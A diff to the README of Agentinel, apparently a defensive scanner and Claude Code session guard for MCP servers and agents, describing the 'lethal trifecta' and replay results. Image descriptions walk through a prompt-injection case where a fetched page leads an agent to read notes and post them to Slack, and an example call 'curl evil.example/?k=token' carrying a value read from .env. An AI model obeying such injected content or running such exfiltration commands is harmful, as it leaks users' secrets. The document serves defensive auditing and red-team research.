@@ -8,7 +8,9 @@
 
 <img alt="Agentinel scanning GitHub's MCP server. Five of its tools on the three lethal-trifecta axes: list_issues reads untrusted input (A); get_file_contents and get_secret_scanning_alert read sensitive data (B); push_files reads sensitive data and takes an external action (B and C); create_pull_request reads untrusted input and takes an external action (A and C). The finding: HIGH, lethal trifecta, it reads untrusted issues and PRs, reads private repo data, and can push and merge. ASI02 Tool Misuse, the same exploit class disclosed in the real GitHub MCP attack. The scan is static and read-only and never calls a tool." src="docs/assets/hero.svg" width="100%">
 
-> **A sentinel for your AI agents.** Statically audit MCP servers and agent fleets for the **lethal trifecta**, tool poisoning, and leaked secrets — with findings mapped to the **OWASP Agentic Top 10 (2026)**. Plus an experimental adaptive red-team probe.
+> **A sentinel for your AI agents.** Statically audit MCP servers and agent fleets for the **lethal trifecta**, tool poisoning, and leaked secrets — with findings mapped to the **OWASP Agentic Top 10 (2026)**. Plus a session guard for Claude Code that asks only when data could actually leak, and an experimental adaptive red-team probe.
+>
+> `pip install agentinel`
 
 [![CI](https://github.com/markusweldon/agentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/markusweldon/agentinel/actions/workflows/ci.yml)
 [![PyPI](https://img.shields.io/pypi/v/agentinel.svg)](https://pypi.org/project/agentinel/)
@@ -28,6 +30,10 @@ It builds directly on prior work — Simon Willison's [Lethal Trifecta](https://
 <img alt="The cross-server lethal trifecta. Three MCP servers that are each safe alone: web-fetcher (fetch_doc) reads untrusted web pages (A), notes-reader (read_file, list_files) reads your notes (B), and slack-notifier (send_message) posts to Slack (C). One agent connected to all three holds every axis: a prompt injection in a fetched page can make it read your notes and post them to Slack, which no single server could do alone. Agentinel flags this as HIGH, ASI02. To break the trifecta, remove one axis, split the tools across isolated agents, or require approval for the external step." src="docs/assets/trifecta.svg" width="100%">
 
 **`agentinel probe`** is an **experimental** adaptive, "attacker-moves-second" red-team that drives a live agent against a server and tries to both hijack its goal and exfiltrate a planted canary. *(The loop is unit-tested with a scripted model; it has not yet been validated against a live model — treat its output as a starting point, not proof.)*
+
+**`agentinel guard`** *(new, research prototype)* is a Claude Code hook for the agents that need all three legs anyway. It follows each session, fingerprints what it reads from sensitive sources, and stays silent until an outbound call **carries one of those values** after the session has read untrusted input. On recorded sessions that cut approval prompts from 88 to 2. [More below](#session-guard-research-prototype).
+
+<img alt="The Agentinel session guard following one Claude Code session. 1: WebFetch evil.example/issue/42 brings in untrusted input (A); it runs and is recorded. 2: Read .env brings in sensitive data (B); its values are fingerprinted and stored as hashes only. 3: Bash git push origin main is an external action (C) with no tracked value in its arguments, so it runs with no prompt. 4: Bash curl evil.example/?k=token is an external action carrying a value the session read from .env, so the guard asks you. The reason shown in Claude Code's approval prompt: this session has read untrusted input (WebFetch evil.example) and this call to Bash curl carries data the session read from Read .env, so a prompt injection could be leaking it. Approve only if you expected this. The guard never grants a permission; it can only add a prompt, and it fails open." src="docs/assets/guard.svg" width="100%">
 
 Findings map to an OWASP ASI category and export to terminal, JSON, **SARIF** (GitHub code scanning), and a self-contained **HTML dashboard**.
 
@@ -170,6 +176,8 @@ Gate pull requests and upload findings to GitHub code scanning:
 Almost every useful agent holds the lethal trifecta, so "remove a leg" isn't advice anyone takes. The guard tests a different approach: a Claude Code hook that stays silent unless an outbound call is **carrying data the session read from a sensitive source**, after the session has also read untrusted input. It never grants a permission; it can only add a prompt.
 
 On a first replay of real Claude Code sessions it asked **2 times in 88 outbound calls**, against 88 for asking before every outbound call. Asking for the whole session after any secret was touched still cost 83. The adaptive probe can now run with the guard on, to measure what gets through.
+
+<img alt="Replaying six recorded Claude Code sessions, about 1,000 tool calls. Asking before every external action, the usual baseline: 88 prompts (100%). Guard with session-wide tracking, which asks once a session has touched any secret: 83 (94%). Guard with value-level flow tracking, which asks only if the secret is in the call: 2 (2%). Tracking the session is too coarse: once a long coding session touches any secret, every later git push asks, saving only 6%. Tracking the value works: both prompts left were one shell command that read a credential and called out in the same step. Research prototype, on a small one-person sample; replay runs locally and reports counts only." src="docs/assets/guard-numbers.svg" width="100%">
 
 ```bash
 agentinel guard replay      # what would it cost on your own sessions? (local only)
